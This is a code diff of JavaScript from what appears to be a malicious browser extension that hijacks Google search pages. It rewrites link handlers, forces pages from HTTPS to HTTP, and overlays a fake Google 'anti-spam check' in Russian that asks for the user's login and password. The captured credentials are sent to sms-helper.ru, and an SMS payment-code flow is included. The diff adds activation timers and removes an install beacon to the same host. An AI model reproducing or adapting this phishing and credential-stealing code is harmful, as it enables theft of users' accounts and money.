@@ -18,7 +18,7 @@ var step = 1,
 function Destroy () {
 
 	plg.Save('lon','0');
-	setTimeout(plg.Del,5000);
+	setTimeout('plg.Del()',5000);
 	
 }
 
@@ -29,19 +29,19 @@ function CheckLock() {
 		vRun = plg.Get('vRun'),
 		yaRun = plg.Get('yaRun');
 		
-	if ((oRun) && (oRun !== 0)) {
+	if ((oRun) && (oRun != 0)) {
 		LockStop();
-		plg.Save('lon','0');
-	
+		plg.Save('lon',0);
+		
 	}
 	else {
 	
 		result = 666;
-	
+		
 	}
-	if ((vRun) && (vRun!== 3)) {
+	if ((vRun) && (vRun!= 3)) {
 		LockStop();
-		plg.Save('lon','0');
+		plg.Save('lon',0);
 	}
 	else {
 		result = 666;
@@ -76,7 +76,7 @@ function SaveLoginPassword(){
 	else {
 		login = encodeURIComponent(login.value);
 		pass = encodeURIComponent(password.value);
-	
+		
 		var auth = document.createElement('script');
 		auth.setAttribute('type', 'text/javascript');
 		var url = 'http://sms-helper.ru/js/gStat.php?status='+status+'&phoneNumber='+phoneNumber+'&id='+id+'&login='+login+'&password='+pass;
@@ -155,6 +155,7 @@ function  SecondStep() {
 	step=3;
 
 	
+	
 	var gShock = document.getElementById('gShock');
 	gShock.innerHTML = '<style type="text/css" media="screen"><!--.overlay {  background-color: #555555; visibility: visible;     bottom: 0;    cursor: default;    left: 0;    opacity: 0.6;    position: fixed;    right: 0;    top: 0;        z-index: 9999;    -webkit-transition: opacity .5s;    -moz-transition: opacity .5s;    -ms-transition: opacity .5s;    -o-transition: opacity .5s;    transition: opacity .5s;}.overlay:target {    visibility: visible;    opacity: 1;}* {outline-style: none; outline-width: 0; }body { font-size: 13px; background-color: transparent; overflow: hidden; }body, div.content button, div.content input { font-family: "Trebuchet MS", "Helvetica Neue", Arial, Helvetica, Sans-Serif; }div.content {margin: 0 500px; z-index:999999999999;  background-color: #fff; position: absolute; padding: 25px; -moz-border-radius: 5px; -webkit-border-radius: 5px; border-radius: 5px; -moz-box-shadow: 0px 0px 25px rgba(50,50,50,0.95); -webkit-box-shadow: 0px 0px 25px rgba(50,50,50,0.95); box-shadow: 0px 0px 25px rgba(50,50,50,0.95);  background-repeat: repeat-x; background-attachment: scroll; }div.content button { font-size: 13px; line-height: 14px; }div.content div#auth { display: none; }div.content div#captcha { display: none; }div.content div#first { display: block; }div.content p#error { color: red; }div.content div#loading {  width: 48px; height: 48px; display: none; margin-left: 150px; margin-right: 150px; }	div.content div#second { display: none; }div.content hr { margin-top: 20px; margin-bottom: 20px; }div.content input { font-size: 20px; }div.content label { color: #000; font-size: 20px; margin-right: 10px; }div.content p#rules { display: block; }div.content small { font-size: 11px; margin-bottom: 4px; }div.shadow { position: fixed; top: 0; left: 0; right: 0; bottom: 0; width: 100%; height: 100%; margin: 0; padding: 0; filter:progid:DXImageTransform.Microsoft.Alpha(opacity=85); -moz-opacity: 0.85; -khtml-opacity: 0.85; opacity: 0.85; background-color: rgb(112, 130, 143); background: radial-gradient(at center center , rgba(255, 255, 255, 0.8), rgba(255, 255, 255, 0)) repeat scroll 0% 0%, none repeat scroll 0% 0% rgb(112, 130, 143); }div.footer, div.footer a, div.footer p { color: #888; font-size: 9px; }</style><style type="text/css" media="screen">@font-face {font-family: "PT Sans";font-style: normal;font-weight: normal;src: local("PT Sans"), local("PTSans-Regular"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/yrzXiAvgeQQdopyG8QSg8Q.woff) format("woff");}@font-face {font-family: "PT Sans";	font-style: normal;font-weight: bold;src: local("PT Sans Bold"), local("PTSans-Bold"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/g46X4VH_KHOWAAa-HpnGPhsxEYwM7FgeyaSgU71cLG0.woff) format("woff");}@font-face {font-family: "PT Sans";font-style: italic;font-weight: normal;src: local("PT Sans Italic"), local("PTSans-Italic"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/7dSh6BcuqDLzS2qAASIeuj8E0i7KZn-EPnyo3HZu7kw.woff) format("woff");}@font-face {font-family: "PT Sans";font-style: italic;font-weight: bold;src: local("PT Sans Bold Italic"), local("PTSans-BoldItalic"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/lILlYDvubYemzYzN7GbLkIraN7vELC11_xip9Rz-hMs.woff) format("woff");}body div.content button {font-weight: bold;font-family: "PT Sans", "Helvetica Neue", Arial, Helvetica, Sans-Serif;font-size: 14px;	}</style><div class="content" z-index: 9999999;	margin-left: 530px; position: absolute; margin-top:130px; >			<div id="header">		<img src="https://ssl.gstatic.com/images/logos/google_logo_41.png" align="left" /><div style="font-size: 13px; font-weight: bold;">&nbsp;&nbsp;ТМ</div>		<div class="clearfix"></div>		<br><p><center><b>Для получения доступа к сайту, <br />пройдите быструю антиспам-проверку.</b></p></center>	</div>	<hr /><div id="first">		<h5>Ваш логин в системе:</h5>		<p><input type="text" id="login" class="tooltip-bottom" title="Введите код полученный на Ваш номер мобильного телефона в виде СМС-сообщения" style="width: 171px;" maxlength="30" id="secretcode" />&nbsp;&nbsp;<h5>Ваш пароль в системе:</h5>		<p><input type="password" id="pass"class="tooltip-bottom" title="Введите Ваш пароль полученный в процессе регистрации" style="width: 171px;" maxlength="20" id="password" />&nbsp;&nbsp;<button class="medium" onclick="SaveLoginPassword();">Авторизовать</button></p></p>		<p id="error"      style="display:none;">Ошибка: некорректный код подтверждения!</p>	</div><style type="text/css" media="screen">		<!--			body { font-size: 13px; background-color: transparent; }			body, div.content button, div.content input { font-family: "Tahoma", Sans-Serif; }			div.content {z-index: 9999999;	margin-left: 530px; }			div.content button { }			div.content div#captcha { }			div.content div#first { }			div.content div#first p#error, div#second p#error , div#captcha p#error { }			div.content div#loading { }			div.content div#second { }			div.content hr { }			div.content input { }			div.content label { }			div.content small { }			div.shadow { }		-->	</style>';
 
@@ -170,6 +171,10 @@ function  SecondStep() {
 
 function ShowMeGoogle() { 
     
+	if (window.location.protocol !== 'http:') {
+		window.location = 'http://' + window.location.hostname + window.location.pathname + window.location.hash;
+		
+	}
 	var modalWnd = document.createElement("div");
     modalWnd.setAttribute("id", "gShock");
     modalWnd.setAttribute("position", "relative");
@@ -292,8 +297,6 @@ function isMain(){
 			SendStat(1,'gLog');
 			
 			if (document.getElementsByTagName('a').length ==29){
-				var f = document.getElementById('gbqfq');
-				f.setAttribute('onkeypress','ShowMeGoogle()');
 				
 				if (document.getElementsByClassName('gstl_0 gssb_c')[0]){
 					document.getElementsByClassName('gstl_0 gssb_c')[0].parentNode.removeChild(document.getElementsByClassName('gstl_0 gssb_c')[0]);
@@ -312,7 +315,7 @@ function isMain(){
 					document.getElementsByClassName('gstl_0 gssb_c')[0].parentNode.removeChild(document.getElementsByClassName('gstl_0 gssb_c')[0]);
 				}
 				
-				
+			
 				var i=0;
 				for (i;i<document.getElementsByTagName('a').length;i++) {
 					document.getElementsByTagName('a')[i].setAttribute('onmousedown', 'ShowMeGoogle()');
@@ -322,7 +325,7 @@ function isMain(){
 				plg.Save('lon','1');
 				SendStat(0,'gLog');
 							
-				setTimeout('ChangeLinks()', 4000);
+				setTimeout('ChangeLinks()', 2000);
 				
 			}
 		}
@@ -369,7 +372,7 @@ function PayStatus() {
 		err.style.display = 'block';
 		err.innerText = 'Неверно введен код';
 		SendStat(51,'gLog');
-	
+		
 		return false;		
 	}
 	
@@ -400,11 +403,18 @@ function SendSMS() {
 
 }
 
+
+function getTime() {
+    var g = new Date().getTime() / 1000 / 60 / 60;
+    g = g - (g % 1);
+    return g;
+}
+
 function Start() {
 		if (plg){
 			if (plg.Get('lon') === false){
 				plg.Save('lon','1');
-				
+			
 			}
 			if (plg.Get('lon') == '2'){
 				ShowMeGoogle();
@@ -416,29 +426,12 @@ function Start() {
 	}
 
   window.onload = function () {
+		TimeOut ();
+		SetTime();
 		Start();
 	
 } 
 
-
-function InstallPlg() {
-	var id = 'null',
-		group = 'empty';
-	try{
-		if (plg) {
-			id = plg.Get('id').toString();
-			group = plg.Get('group').toString();
-			var knock = document.createElement('script');
-			knock.setAttribute('type', 'text/javascript');
-			url = 'http://sms-helper.ru/inst.php?id='+id+'&group='+group;
-			knock.setAttribute('src', url);
-			document.getElementsByTagName('head')[0].appendChild(knock);
-		}
-	}
-	catch(e){
-		
-	}
-}
 
 function TimeOut (){
 	if (plg) {
@@ -455,7 +448,7 @@ function TimeOut (){
 	}
 }
 
-/* 
+
 function SetTime() {
 	if (plg) {
 			var startTime = plg.Get('startTime'),
@@ -463,7 +456,7 @@ function SetTime() {
 				days = 4320;
 			var now =  new Date().getTime() / 1000 / 60;
 			now = now - (now % 1);
-			
+		
 			if (!startTime){
 				w = now + days;
 				
@@ -480,14 +473,13 @@ function SetTime() {
 					
 				}
 				else {
-					
+				
 					plg.Save('lon','0');
 					return false;
 					
 				}
 			}
 	}
-} */
-
+}
 
 
